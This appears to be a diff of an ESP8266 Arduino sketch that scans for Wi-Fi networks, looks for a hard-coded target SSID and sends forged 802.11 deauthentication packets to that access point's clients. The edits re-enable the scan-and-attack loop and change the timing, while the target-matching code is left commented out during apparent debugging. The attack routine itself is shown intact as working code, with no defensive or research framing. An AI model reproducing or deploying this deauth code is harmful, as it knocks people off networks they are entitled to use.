@@ -4,7 +4,7 @@ extern "C" {
 #include "user_interface.h"
 }
 
-#define NUMNET 30
+#define NUMNET 50
 #define MAC_ADDR_LEN 6
 #define PACKET_SIZE 26
 
@@ -39,18 +39,19 @@ void setup() {
 }
 
 void loop() {
-  // if(!found){
-  //   Serial.println("Trying to find target...");
-  //   findNewNetworks();
-  // }else{
-  //   Serial.println("Deauthing...");
-  //   deauthAttack();
-  // }
+  if(!found){
+    findNewNetworks();
+  }else{
+    deauthAttack();
+  }
 
-  deauthAttack();
+  // deauthAttack();
 }
 // void deauthAttack() {
 void deauthAttack() {
+  Serial.println("Deauthing...");
+
+  
   wifi_set_channel(targetChannel);//same channel as target AP
   uint8_t newPacket[PACKET_SIZE];
   memcpy(newPacket, deauthPacket, PACKET_SIZE);
@@ -66,7 +67,7 @@ void deauthAttack() {
     }else{
       Serial.printf("DEAUTH PACKET SENT: %d\n", result);
     }
-    delay(20);  // Adjust delay as needed
+    delay(5000);  // Adjust delay as needed
   }
 }
 
@@ -79,47 +80,52 @@ void restart(){
 }
 
 void findNewNetworks(){
+  Serial.println("Trying to find target...");
   uint8_t foundNetworks = WiFi.scanNetworks();
+  uint8_t BSSID[6];
 
   // loop all found networks
   for (uint8_t i = 0; i < foundNetworks; i++){
     
-    uint8_t* newBSSID = WiFi.BSSID(i);
-    bool newNetwork = true;
+    memcpy(BSSID, WiFi.BSSID(i), 6);
 
+    bool newNetwork = true;
     // if any found networks have been seen before
     for (uint8_t k = 0; k < numNetworks; k++){
-      if(memcmp(newBSSID, knownBSSIDS[k], MAC_ADDR_LEN) == 0){
-        newNetwork = false;
-        break;
-      }
+      Serial.printf("k: %d\n", k);
+
+
+      // When this is uncommented it errors???? but the Serial printf above is never printed because numNetworks = 0
+      // if(memcmp(BSSID, knownBSSIDS[k], MAC_ADDR_LEN) == 0){
+      //   newNetwork = false;
+      //   break;
+      // }
     }
 
     // new network confirmed, add to list of known networks
-    if(newNetwork){
-      if (numNetworks < NUMNET) {
-        knownBSSIDS[numNetworks] = (uint8_t*)malloc(MAC_ADDR_LEN * sizeof(uint8_t));
-        memcpy(knownBSSIDS[numNetworks], newBSSID, MAC_ADDR_LEN);
-        numNetworks++;
-      }else{
-        printf("All network slots filled. Restarting");
-        restart();
-        return;
-      }
+    // if(newNetwork){
+    //   if (numNetworks < NUMNET) {
+    //     knownBSSIDS[numNetworks] = BSSID;
+    //     numNetworks++;
+    //   }else{
+    //     printf("All network slots filled. Restarting");
+    //     restart();
+    //     return;
+    //   }
 
-      Serial.println("\nNew Network found");
-      Serial.printf("SSID   : %s\n", WiFi.SSID(i).c_str());
-      Serial.printf("BSSID  : %s\n", WiFi.BSSIDstr(i).c_str());
-      Serial.printf("Channel: %d\n", WiFi.channel(i));
+      // Serial.println("\nNew Network found");
+      // Serial.printf("SSID   : %s\n", WiFi.SSID(i).c_str());
+      // Serial.printf("BSSID  : %s\n", WiFi.BSSIDstr(i).c_str());
+      // Serial.printf("Channel: %d\n", WiFi.channel(i));
 
-      if(strcmp(WiFi.SSID(i).c_str(), targetSSID) == 0){
-        Serial.println("bowenIntranetFibre FOUND");
+      // if(strcmp(WiFi.SSID(i).c_str(), targetSSID) == 0){
+      //   Serial.printf("%s FOUND\n", targetSSID);
 
-        found = true;
-        memcpy(targetBSSID, newBSSID, MAC_ADDR_LEN);
-        targetChannel = WiFi.channel(i);
-        break;
-      }
-    }
+      //   found = true;
+      //   memcpy(targetBSSID, BSSID, MAC_ADDR_LEN);
+      //   targetChannel = WiFi.channel(i);
+      //   break;
+      // }
+    // }
   }
 }
